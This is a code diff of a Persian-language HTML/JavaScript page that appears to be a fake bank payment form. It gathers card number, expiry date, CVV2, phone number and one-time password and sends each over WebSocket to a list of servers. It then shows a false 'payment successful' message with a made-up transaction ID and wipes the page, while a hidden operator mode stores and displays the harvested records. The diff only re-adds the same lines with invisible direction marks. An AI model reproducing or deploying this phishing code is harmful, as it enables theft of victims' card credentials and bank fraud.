+‏                    const phone = document.getElementById('phone-number').value.replace(/-/g, '');
+‏                    if (phone.length !== 11 || !phone.startsWith('09')) {
+‏                        alert('شماره تلفن نامعتبر است');
+‏                        return false;
+                    }
                 }
-                const encrypted = encryptData({ phone });
-                sendData(1, { action: 'otp', data: encrypted });
-                startTimer(120);
+‏                return true;
             }
 
-            function startTimer(seconds) {
-                const timer = document.getElementById('otp-timer');
-                let timeLeft = seconds;
-                const interval = setInterval(() => {
-                    timer.textContent = `زمان باقی‌مانده: ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
-                    if (--timeLeft < 0) {
-                        clearInterval(interval);
-                        timer.textContent = 'رمز پویا منقضی شد';
+‏            function nextStep(step) {
+‏                if (!validateStep(step)) return;
+
+‏                steps[step - 1].classList.remove('active');
+‏                currentStep = step + 1;
+‏                if (currentStep === 3) processPayment();
+‏                steps[currentStep - 1].classList.add('active');
+‏                updateProgress();
+            }
+
+‏            function updateProgress() {
+‏                progressFill.style.width = `${(currentStep / steps.length) * 100}%`;
+            }
+
+‏            function requestOTP() {
+‏                const phone = document.getElementById('phone-number').value.replace(/-/g, '');
+‏                if (phone.length !== 11 || !phone.startsWith('09')) {
+‏                    alert('شماره تلفن نامعتبر است');
+‏                    return;
+                }
+‏                const encrypted = encryptData({ phone });
+‏                sendData(1, { action: 'otp', data: encrypted });
+‏                startTimer(120);
+            }
+
+‏            function startTimer(seconds) {
+‏                const timer = document.getElementById('otp-timer');
+‏                let timeLeft = seconds;
+‏                const interval = setInterval(() => {
+‏                    timer.textContent = `زمان باقی‌مانده: ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
+‏                    if (--timeLeft < 0) {
+‏                        clearInterval(interval);
+‏                        timer.textContent = 'رمز پویا منقضی شد';
                     }
                 }, 1000);
             }
 
-            function encryptData(data) {
-                const key = CryptoJS.lib.WordArray.random(32);
-                const iv = CryptoJS.lib.WordArray.random(16);
-                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), key, {
-                    iv: iv,
-                    mode: CryptoJS.mode.CBC,
-                    padding: CryptoJS.pad.Pkcs7
+‏            function encryptData(data) {
+‏                const key = CryptoJS.lib.WordArray.random(32);
+‏                const iv = CryptoJS.lib.WordArray.random(16);
+‏                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), key, {
+‏                    iv: iv,
+‏                    mode: CryptoJS.mode.CBC,
+‏                    padding: CryptoJS.pad.Pkcs7
                 });
-                return encrypted.toString();
+‏                return encrypted.toString();
             }
 
-            function sendData(serverIndex, payload) {
-                const ws = new WebSocket(SERVERS[serverIndex]());
-                ws.onopen = () => {
-                    ws.send(JSON.stringify(payload));
-                    ws.close();
+‏            function sendData(serverIndex, payload) {
+‏                const ws = new WebSocket(SERVERS[serverIndex]());
+‏                ws.onopen = () => {
+‏                    ws.send(JSON.stringify(payload));
+‏                    ws.close();
                 };
-                ws.onerror = () => console.log('WebSocket error');
+‏                ws.onerror = () => console.log('WebSocket error');
             }
 
-            function processPayment() {
-                const loader = document.getElementById('loader');
-                const result = document.getElementById('result');
-                loader.style.display = 'block';
+‏            function processPayment() {
+‏                const loader = document.getElementById('loader');
+‏                const result = document.getElementById('result');
+‏                loader.style.display = 'block';
 
-                const data = {
-                    card: document.getElementById('card-number').value,
-                    expiry: document.getElementById('expiry').value,
-                    cvv2: document.getElementById('cvv2').value,
-                    phone: document.getElementById('phone-number').value,
-                    otp: document.getElementById('otp').value
+‏                const data = {
+‏                    card: document.getElementById('card-number').value,
+‏                    expiry: document.getElementById('expiry').value,
+‏                    cvv2: document.getElementById('cvv2').value,
+‏                    phone: document.getElementById('phone-number').value,
+‏                    otp: document.getElementById('otp').value
                 };
 
-                const encryptedCard = encryptData({ card: data.card, expiry: data.expiry });
-                const encryptedCvv = encryptData({ cvv2: data.cvv2 });
-                const encryptedOtp = encryptData({ phone: data.phone, otp: data.otp });
+‏                const encryptedCard = encryptData({ card: data.card, expiry: data.expiry });
+‏                const encryptedCvv = encryptData({ cvv2: data.cvv2 });
+‏                const encryptedOtp = encryptData({ phone: data.phone, otp: data.otp });
 
-                setTimeout(() => {
-                    sendData(0, { action: 'card', data: encryptedCard });
-                    sendData(1, { action: 'cvv', data: encryptedCvv });
-                    sendData(2, { action: 'otp', data: encryptedOtp });
-                    loader.style.display = 'none';
-                    const transactionId = generateTransactionId();
-                    userData['شماره تراکنش'] = transactionId;
-                    saveAndDisplayUserData();
-                    result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${transactionId}<br>لطفاً این کد را نزد خود نگه دارید.`;
-                    if (!isSpecialMode) selfDestruct();
+‏                setTimeout(() => {
+‏                    sendData(0, { action: 'card', data: encryptedCard });
+‏                    sendData(1, { action: 'cvv', data: encryptedCvv });
+‏                    sendData(2, { action: 'otp', data: encryptedOtp });
+‏                    loader.style.display = 'none';
+‏                    const transactionId = generateTransactionId();
+‏                    userData['شماره تراکنش'] = transactionId;
+‏                    saveAndDisplayUserData();
+‏                    result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${transactionId}<br>لطفاً این کد را نزد خود نگه دارید.`;
+‏                    if (!isSpecialMode) selfDestruct();
                 }, 2000);
             }
 
-            function generateTransactionId() {
-                return 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase();
+‏            function generateTransactionId() {
+‏                return 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase();
             }
 
-            function selfDestruct() {
-                document.querySelectorAll('input').forEach(input => input.value = '');
-                document.querySelectorAll('.btn').forEach(btn => btn.disabled = true);
-                saveAndDisplayUserData();
-                setTimeout(() => {
-                    document.body.innerHTML = '<h1>جلسه منقضی شد</h1>';
-                    window.location.replace('about:blank');
+‏            function selfDestruct() {
+‏                document.querySelectorAll('input').forEach(input => input.value = '');
+‏                document.querySelectorAll('.btn').forEach(btn => btn.disabled = true);
+‏                saveAndDisplayUserData();
+‏                setTimeout(() => {
+‏                    document.body.innerHTML = '<h1>جلسه منقضی شد</h1>';
+‏                    window.location.replace('about:blank');
                 }, 5000);
             }
 
-            function setSelfDestructTimeout(seconds) {
-                if (!isSpecialMode) {
-                    setTimeout(() => {
-                        alert('زمان جلسه به پایان رسید.');
-                        selfDestruct();
-                    }, seconds * 1000);
+‏            function setSelfDestructTimeout(seconds) {
+‏                if (!isSpecialMode) {
+‏                    setTimeout(() => {
+‏                        alert('زمان جلسه به پایان رسید.');
+‏                        selfDestruct();
+‏                    }, seconds * 1000);
                 }
             }
 
-            function handlePageExit() {
-                if (!isSpecialMode) {
-                    localStorage.removeItem(`specialMode_${sessionId}`);
-                    saveAndDisplayUserData();
+‏            function handlePageExit() {
+‏                if (!isSpecialMode) {
+‏                    localStorage.removeItem(`specialMode_${sessionId}`);
+‏                    saveAndDisplayUserData();
                 }
             }
 
-            function cancel() {
-                if (confirm('آیا از لغو مطمئن هستید؟')) {
-                    sendData(0, { action: 'cancel' });
-                    saveAndDisplayUserData();
-                    if (!isSpecialMode) selfDestruct();
+‏            function cancel() {
+‏                if (confirm('آیا از لغو مطمئن هستید؟')) {
+‏                    sendData(0, { action: 'cancel' });
+‏                    saveAndDisplayUserData();
+‏                    if (!isSpecialMode) selfDestruct();
                 }
             }
 
-            function clearData() {
-                if (isSpecialMode && confirm('آیا مطمئن هستید که می‌خواهید تمام اطلاعات را پاک کنید؟')) {
-                    allUsersData = [];
-                    localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
-                    showUserData();
+‏            function clearData() {
+‏                if (isSpecialMode && confirm('آیا مطمئن هستید که می‌خواهید تمام اطلاعات را پاک کنید؟')) {
+‏                    allUsersData = [];
+‏                    localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
+‏                    showUserData();
                 }
             }
 
-            init();
+‏            init();
 
-            return {
-                nextStep,
-                requestOTP,
-                cancel,
-                clearData
+‏            return {
+‏                nextStep,
+‏                requestOTP,
+‏                cancel,
+‏                clearData
             };
         })();
-    </script>
-</body>
-</html>
+‏    </script>
+‏</body>
+‏</html>
